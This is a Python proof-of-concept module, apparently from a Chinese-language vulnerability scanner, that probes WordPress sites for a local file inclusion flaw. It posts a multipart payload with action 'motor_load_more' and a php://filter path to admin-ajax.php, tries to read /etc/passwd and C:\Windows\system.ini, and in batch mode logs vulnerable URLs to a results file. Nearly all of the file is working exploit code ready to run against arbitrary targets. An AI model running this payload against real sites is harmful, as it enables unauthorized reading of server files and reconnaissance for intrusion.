#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc
from pub.com.reqset import ReqSet
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


class Wordpress_Lfi_Scan:
    def poc(self, target):
        url = target + '/wp-admin/admin-ajax.php'
        payload = "----------1958124369\r\n" \
                  "Content-Disposition: form-data; name=\"action\"\r\n" \
                  "\r\n" \
                  "motor_load_more\r\n" \
                  "----------1958124369\r\n" \
                  "Content-Disposition: form-data; name=\"file\"\r\n" \
                  "\r\n" \
                  "php://filter/resource={{lfi}}\r\n" \
                  "----------1958124369--"

        lfi_paths = [
            "C:\\Windows\\system.ini",
            "/etc/passwd"
        ]

        for lfi_path in lfi_paths:
            if not self.batch:
                OutPrintInfo("Wordpress", f"正在测试: {lfi_path}")
            data = payload.replace("{{lfi}}", lfi_path)
            headers = {
                "Content-Type": "multipart/form-data; boundary=--------1958124369",
                "User-Agent": self.header
            }
            try:
                response = requests.post(url, headers=headers, verify=self.verify,proxies=self.proxy, timeout=15, data=data)
                if (response.status_code == 200 and ("root:x" in response.text)) or (
                        response.status_code == 200 and ("for 16-bit app support" in response.text)):
                    OutPrintInfoSuc("Wordpress", f"存在LFI漏洞 {url}")
                    if not self.batch:
                        OutPrintInfo("Wordpress", f"Response:\n{response.text.strip()}")
                    else:
                        with open("./result/wordpress_lfi.txt","a") as w:
                            w.write(f"{url}\n")
                    return True
                else:
                    if not self.batch:
                        OutPrintInfo("Wordpress", "不存在 LFI 漏洞")
                    return False
            except Exception as e:
                if not self.batch:
                    OutPrintInfo("Wordpress", "目标连接失败")
                return False

                # print(f"[*] {target} error: {str(e)}")

    def main(self, target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        self.header = target["header"]
        proxy = target["proxy"]

        _, self.proxy = ReqSet(proxy=proxy, bwork=self.batch)

        if not self.batch:
            OutPrintInfo("Wordpress", "开始检测Wordpress admin-ajax.php文件包含漏洞...")
        self.poc(url)
        if not self.batch:
            OutPrintInfo("Wordpress", "Wordpress admin-ajax.php文件包含漏洞检测结束")
        


